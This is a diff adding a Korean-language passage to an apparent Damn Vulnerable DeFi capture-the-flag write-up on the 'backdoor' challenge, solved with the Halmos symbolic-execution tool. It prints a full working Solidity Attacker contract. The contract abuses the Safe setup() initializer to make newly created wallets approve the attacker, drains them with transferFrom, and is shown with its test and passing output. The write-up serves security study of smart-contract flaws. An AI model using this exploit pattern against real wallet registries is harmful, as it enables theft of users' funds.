@@ -899,3 +899,109 @@ According to tradition, this should be some effort "to fit a square peg into a r
 5. Halmos can sometimes behave non-deterministically under high load. Using non-optimistic options can help make Halmos work more deterministic.
 ## Next challenge
 Next writeup in this series is [climber](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/climber)
+```solidity
+              p_to_address_7a0345f_113 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
+              p_to_address_b19e0c9_11 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
+              p_value_uint256_41861fd_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
+              ...
+```
+이 반례는 많은 노이즈를 포함하고 있지만, 그 안에서 버그의 본질을 추출할 수 있습니다. 누구나 **Alice**를 위한 **Safe** 지갑을 만들 수 있습니다. 하지만 동시에 생성 과정에서, 공격자는 `setup()`을 사용하고 적절한 코드를 `initializer`로 전달함으로써 **Alice**의 **SafeProxy**를 대신하여 절대적으로 어떤 코드든 호출할 수 있습니다. 그래서 Halmos는 **SafeProxy**가 어떤 `symbolic_spender`에 대해 `approve`를 실행하도록 강제했고, 그로 인해 `allowance`가 없다는 불변 조건을 깨뜨렸습니다.
+
+사실 이것만으로도 공격 시나리오가 명백해집니다: **Alice**, **Bob**, **Charlie**, **David**를 위한 **Safe** 지갑을 생성할 때, 우리가 제어하는 계약에 대해 `approve`를 만들고 새로 생성된 지갑에서 자금을 인출합니다.
+
+참고로 이 공격을 위해 **Safe** 계약을 프록시로 사용하는 것은 선택 사항입니다. 단지 Halmos가 그러한 방법을 찾았을 뿐입니다.
+
+## 공격 생성
+Attacker:
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity =0.8.25;
+
+import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
+import "../../src/backdoor/WalletRegistry.sol";
+import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+
+contract Attacker {
+    DamnValuableToken token;
+    SafeProxyFactory factory;
+    WalletRegistry registry;
+    address singleton;
+    address recovery;
+
+    constructor(DamnValuableToken _token, 
+                SafeProxyFactory _factory, 
+                WalletRegistry _registry, 
+                address _singleton, 
+                address _recovery) {
+        token = _token;
+        factory = _factory;
+        registry = _registry;
+        singleton = _singleton;
+        recovery = _recovery;
+    }
+
+    function handle_delegatecall(DamnValuableToken _token, address attacker) public {
+        _token.approve(attacker, 10e18);
+    }
+
+    function attack(address[] calldata users) public {
+        for (uint i = 0; i < 4; i++){
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            bytes memory attacking_data = abi.encodeCall(
+                this.handle_delegatecall, (token, address(this)));
+
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,
+                    1,
+                    address(this),
+                    attacking_data,
+                    address(0),
+                    address(0),
+                    0,
+                    payable(address(0))
+                )
+            );
+
+            SafeProxy wallet = factory.createProxyWithCallback(singleton, initializer, 1, IProxyCreationCallback(registry));
+
+            token.transferFrom(address(wallet), recovery, 10e18);
+        }
+    }
+}
+```
+`test_backdoor`:
+```solidity
+function test_backdoor() public checkSolvedByPlayer {
+    Attacker attacker = new Attacker(token, walletFactory, walletRegistry, address(singletonCopy), recovery);
+    attacker.attack(users);
+}
+```
+실행:
+```javascript
+$ forge test --mp test/backdoor/Backdoor.t.sol
+...
+Ran 2 tests for test/backdoor/Backdoor.t.sol:BackdoorChallenge
+[PASS] test_assertInitialState() (gas: 62853)
+[PASS] test_backdoor() (gas: 2167005)
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.43ms (1.69ms CPU time)      
+```
+성공!
+
+## 퍼징은?
+전통에 따르면, 퍼징 엔진이 현재 문제에서 작동하도록 "네모난 못을 둥근 구멍에 맞추려는" 노력이 있어야 합니다. 하지만 사실, 우리는 이것에서 어떤 "학문적 새로움"도 찾을 것 같지 않습니다. 우리는 이미 높은 수준의 추상화가 있는 작업에서 Echidna가 어떻게 행동하는지, 그리고 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#fuzzing-vs-selfie)의 예에서 문제를 해결하기 위해 준비하는 것이 얼마나 부자연스럽고 불편하며 심지어 "사기"처럼 보이는지 보았습니다. 따라서 이 글에서는 저 자신이나 독자를 고문하지 않을 것이며, 퍼징을 통한 해결책 찾기를 포기할 것입니다. 하지만 퍼징을 통한 우아한 해결책이 존재한다면 기꺼이 살펴보고 싶습니다. 제 결론이 틀렸다면 기쁠 것입니다 :D.
+
+## 결론
+1. Halmos는 추상화로 과부하된 계약의 경우에도 강력한 도구임이 입증되었습니다. 중요한 것은 코드 커버리지를 꼼꼼하게 처리하고 휴리스틱을 통한 최적화를 능숙하게 사용하는 것입니다.
+2. 기사에서 보여준 것처럼 특별한 `handle_delegatecall` 접근 방식을 통해 심볼릭 `delegatecalls`를 처리하는 것이 매우 편리하며 아마도 가장 정확할 것입니다.
+3. `owners` 목록과 **SafeProxy**의 `fallback` 예에서 볼 수 있듯이, 때로는 Halmos가 대처할 수 있도록 타겟 계약의 일부 기능 구현 로직 자체를 변경해야 할 때가 있습니다.
+4. 다시 한번, 타겟 계약의 비즈니스 로직을 기반으로 사용자 정의 불변 조건을 확인하는 것이 좋은 아이디어임을 확인합니다. 그러한 불변 조건(`allowance` 불변 조건)을 추가한 덕분에, 우리는 작업을 하나의 심볼릭 트랜잭션으로 완료했습니다.
+5. Halmos는 때때로 높은 부하에서 비결정적으로 동작할 수 있습니다. 비낙관적(non-optimistic) 옵션을 사용하면 Halmos가 더 결정적으로 작동하도록 도울 수 있습니다.
+
+## 다음 챌린지
+이 시리즈의 다음 글은 [climber](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/climber)입니다.
